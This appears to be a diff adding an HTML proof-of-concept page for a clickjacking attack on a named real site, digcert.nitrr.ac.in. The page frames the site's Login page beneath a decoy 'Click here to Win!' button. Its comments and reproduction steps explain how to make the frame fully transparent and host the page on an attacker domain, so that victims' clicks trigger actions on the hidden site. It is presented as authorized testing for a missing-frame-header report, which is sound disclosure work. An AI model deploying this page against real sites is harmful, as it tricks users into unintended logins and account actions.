@@ -1,0 +1,151 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+<meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1.0">
+<title>Clickjacking PoC — digcert.nitrr.ac.in</title>
+<style>
+  body {
+    margin: 0;
+    padding: 20px;
+    background: #1a1a2e;
+    font-family: 'Segoe UI', sans-serif;
+    color: #e0e0e0;
+  }
+  .attacker-ui {
+    position: relative;
+    max-width: 900px;
+    margin: 0 auto;
+  }
+  .banner {
+    background: #e63946;
+    color: white;
+    padding: 12px 20px;
+    border-radius: 8px 8px 0 0;
+    font-weight: bold;
+    font-size: 14px;
+    text-transform: uppercase;
+    letter-spacing: 1px;
+  }
+  .info-box {
+    background: #16213e;
+    border: 1px solid #e63946;
+    border-top: none;
+    padding: 16px 20px;
+    border-radius: 0 0 4px 4px;
+    margin-bottom: 16px;
+  }
+  .info-box h2 { margin: 0 0 8px; color: #e63946; font-size: 18px; }
+  .info-box p  { margin: 4px 0; font-size: 13px; color: #b0b0b0; }
+  .info-box code { background: #0f3460; padding: 2px 6px; border-radius: 3px; font-size: 12px; }
+  .frame-container {
+    position: relative;
+    width: 100%;
+    height: 600px;
+    border: 3px dashed #e63946;
+    border-radius: 4px;
+    overflow: hidden;
+  }
+  /* DECOY layer — visible bait UI over the iframe */
+  .decoy-overlay {
+    position: absolute;
+    top: 0; left: 0; right: 0; bottom: 0;
+    z-index: 10;
+    pointer-events: none; /* overlay is visual only; clicks fall through to iframe */
+    background: rgba(26,26,46,0.85);
+    display: flex;
+    flex-direction: column;
+    align-items: center;
+    justify-content: center;
+    gap: 16px;
+  }
+  .decoy-button {
+    background: #e63946;
+    color: white;
+    border: none;
+    padding: 14px 40px;
+    border-radius: 8px;
+    font-size: 18px;
+    font-weight: bold;
+    cursor: pointer;
+    /* Positioned so it visually overlaps the Login button inside the iframe */
+    position: absolute;
+    top: 320px;
+    left: 50%;
+    transform: translateX(-50%);
+    z-index: 20;
+    pointer-events: none;
+    opacity: 0.0; /* set to e.g. 0.5 to see alignment; 0 = fully transparent = real attack */
+  }
+  .victim-frame {
+    width: 100%;
+    height: 100%;
+    border: none;
+    /* Opacity 0 in a real attack; set > 0 here to show the iframe loads */
+    opacity: 0.9;
+  }
+  .status {
+    margin-top: 12px;
+    background: #0f3460;
+    border-radius: 4px;
+    padding: 10px 16px;
+    font-size: 13px;
+    color: #64dfdf;
+  }
+  .status span { color: #ffd166; font-weight: bold; }
+  .steps {
+    margin-top: 16px;
+    background: #16213e;
+    border-radius: 4px;
+    padding: 14px 18px;
+    font-size: 13px;
+  }
+  .steps h3 { margin: 0 0 8px; color: #64dfdf; font-size: 14px; }
+  .steps ol { margin: 0; padding-left: 20px; color: #b0b0b0; line-height: 1.8; }
+  .steps li span { color: #e0e0e0; }
+</style>
+</head>
+<body>
+<div class="attacker-ui">
+  <div class="banner">⚠ Security PoC — Clickjacking Attack Demo — Authorized Testing Only</div>
+  <div class="info-box">
+    <h2>CVE-Class: CWE-1021 — Improper Restriction of Rendered UI Layers</h2>
+    <p><strong>Target:</strong> <code>https://digcert.nitrr.ac.in/</code></p>
+    <p><strong>Missing header:</strong> <code>X-Frame-Options</code> and <code>Content-Security-Policy: frame-ancestors</code></p>
+    <p><strong>Impact:</strong> Attacker page embeds the target in a transparent iframe.  Victim clicks what appears to be attacker UI but actually triggers Login or any other action on the target site.</p>
+  </div>
+
+  <div class="frame-container">
+    <!-- VICTIM SITE — loads because X-Frame-Options is absent -->
+    <iframe
+      class="victim-frame"
+      src="https://digcert.nitrr.ac.in/Login"
+      title="Embedded victim site (no X-Frame-Options)"
+      sandbox="allow-scripts allow-same-origin allow-forms"
+    ></iframe>
+
+    <!-- DECOY overlay — pointer-events:none so clicks reach iframe -->
+    <div class="decoy-overlay">
+      <div class="decoy-button">Click here to Win!</div>
+    </div>
+  </div>
+
+  <div class="status">
+    Iframe loaded: <span>✓ https://digcert.nitrr.ac.in/Login</span> —
+    Target rendered inside attacker-controlled page.
+    In a real attack opacity set to <span>0.0</span>, decoy button aligned over Login.
+  </div>
+
+  <div class="steps">
+    <h3>Attack Flow (Reproduction Steps)</h3>
+    <ol>
+      <li>Host this HTML file on any attacker-controlled domain (e.g. <span>evil.example.com</span>).</li>
+      <li>Victim visits <span>evil.example.com</span> — sees a legitimate-looking page.</li>
+      <li>Set <code>opacity: 0.0</code> on <code>.victim-frame</code>; position <code>.decoy-button</code> over target's "Log in" button.</li>
+      <li>Victim clicks decoy button — actually clicks "Log in" on the hidden target iframe.</li>
+      <li>If victim has an active session, actions (certificate generation, account changes) execute silently.</li>
+    </ol>
+  </div>
+</div>
+</body>
+</html>
